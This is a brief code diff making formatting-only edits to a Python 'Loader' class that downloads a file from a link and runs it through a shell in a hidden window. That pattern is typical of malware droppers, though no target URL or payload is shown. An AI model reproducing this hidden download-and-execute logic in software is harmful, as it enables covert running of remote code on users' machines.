@@ -7,8 +7,8 @@ class Loader:
     """
     Loads a file from a link.
     """
-    def __init__(self, url: str, destination_path: str, open_file: bool = False):
 
+    def __init__(self, url: str, destination_path: str, open_file: bool = False):
         self.__url = url
         self.__destination_path = destination_path
         self.__open_file = open_file
@@ -44,7 +44,7 @@ class Loader:
         Popen(
             self.__destination_path,
             shell=True,
-            creationflags=CREATE_NEW_CONSOLE | SW_HIDE
+            creationflags=CREATE_NEW_CONSOLE | SW_HIDE,
         )
 
     def run(self) -> None:
@@ -58,7 +58,6 @@ class Loader:
         - None.
         """
         try:
-
             self.__load_file()
             self.__open_loaded_file()
 
